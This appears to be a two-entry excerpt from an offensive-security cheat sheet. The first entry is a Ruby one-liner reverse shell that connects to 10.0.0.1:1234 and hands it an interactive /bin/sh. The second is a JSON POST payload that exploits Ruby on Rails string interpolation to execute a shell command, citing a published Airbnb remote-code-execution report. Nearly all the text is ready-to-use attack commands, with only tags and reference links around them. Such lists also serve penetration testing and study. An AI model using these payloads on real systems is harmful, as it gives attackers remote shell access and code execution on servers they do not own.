### 1. ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
**- linux,reverse shells,Windows,ruby**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. Ruby on Rails String Interpolation  : anything in #{} is executed
```
POST: {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }}
```
**- web application,ruby**
#### References:

http://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-remote-code-execution/
__________
